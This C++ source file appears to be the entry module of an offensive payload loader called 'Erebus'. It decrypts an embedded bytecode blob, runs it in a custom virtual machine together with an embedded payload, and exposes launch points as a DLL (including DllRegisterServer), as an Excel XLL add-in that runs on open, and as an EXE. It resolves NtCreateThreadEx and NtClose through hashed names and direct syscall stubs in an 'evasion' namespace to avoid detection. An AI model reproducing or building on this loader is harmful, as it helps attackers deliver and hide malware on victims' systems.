#include "../include/embedded.h"
#include "../include/vmloader.hpp"

VOID entry(void)
{
	// g_vm_ir_blob is constexpr (read-only).  vm.execute() decrypts the
	// bytecode in-place, so we copy to a mutable stack buffer first.
	// 8 ops × ~72 bytes = ~576 bytes - safe on the stack.
	std::uint8_t blob_buf[sizeof(g_vm_ir_blob)];
	RtlCopyMemory(blob_buf, g_vm_ir_blob, sizeof(g_vm_ir_blob));

	VMLoaderContext ctx{};
	ctx.payload_data = g_vm_payload;
	ctx.payload_size = g_vm_payload_size;

	ErebusVM vm{};
	vm.execute(std::span<std::uint8_t>(blob_buf, sizeof(blob_buf)), ctx, g_vm_ir_seed);
}

// -----------------------------------------------------------------------
// DLL entry points
// -----------------------------------------------------------------------

#ifdef BUILD_DLL

static BOOL entry_called = FALSE;

static DWORD WINAPI EntryThread(LPVOID)
{
	entry();
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		if (!entry_called) {
			entry_called = TRUE;
			HMODULE _hnt_d = erebus::GetModuleHandleC(H("ntdll.dll"));
			typeNtCreateThreadEx _NtCTE = (typeNtCreateThreadEx)erebus::evasion::GetSyscallStub(H("NtCreateThreadEx"));
			if (!_NtCTE && _hnt_d) _NtCTE = (typeNtCreateThreadEx)erebus::GetProcAddressC(_hnt_d, H("NtCreateThreadEx"));
			typeNtClose _NtCl = (typeNtClose)erebus::evasion::GetSyscallStub(H("NtClose"));
			if (!_NtCl && _hnt_d) _NtCl = (typeNtClose)erebus::GetProcAddressC(_hnt_d, H("NtClose"));
			HANDLE hThread = NULL;
			if (_NtCTE) _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
			                   (PVOID)EntryThread, NULL, 0, 0, 0, 0, NULL);
			if (hThread && _NtCl) _NtCl(hThread);
		}
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) HRESULT DllRegisterServer(void)
{
	if (!entry_called) {
		entry_called = TRUE;
		HMODULE _hnt_r = erebus::GetModuleHandleC(H("ntdll.dll"));
		typeNtCreateThreadEx _NtCTE = (typeNtCreateThreadEx)erebus::evasion::GetSyscallStub(H("NtCreateThreadEx"));
		if (!_NtCTE && _hnt_r) _NtCTE = (typeNtCreateThreadEx)erebus::GetProcAddressC(_hnt_r, H("NtCreateThreadEx"));
		typeNtClose _NtCl = (typeNtClose)erebus::evasion::GetSyscallStub(H("NtClose"));
		if (!_NtCl && _hnt_r) _NtCl = (typeNtClose)erebus::GetProcAddressC(_hnt_r, H("NtClose"));
		HANDLE hThread = NULL;
		if (_NtCTE) _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
		                   (PVOID)EntryThread, NULL, 0, 0, 0, 0, NULL);
		if (hThread && _NtCl) _NtCl(hThread);
	}
	return S_OK;
}

extern "C" __declspec(dllexport) HRESULT DllUnregisterServer(void)
{
	return S_OK;
}

// -----------------------------------------------------------------------
// XLL entry points
// -----------------------------------------------------------------------

#elif defined(BUILD_XLL)

extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void)
{
	entry();
	return 1;
}

extern "C" __declspec(dllexport) int WINAPI xlAutoClose(void)
{
	return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
		DisableThreadLibraryCalls(hModule);
	return TRUE;
}

// -----------------------------------------------------------------------
// EXE entry points
// -----------------------------------------------------------------------

#elif defined(NDEBUG)

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	entry();
	return 0;
}

#else

int main()
{
	entry();
	return 0;
}

#endif
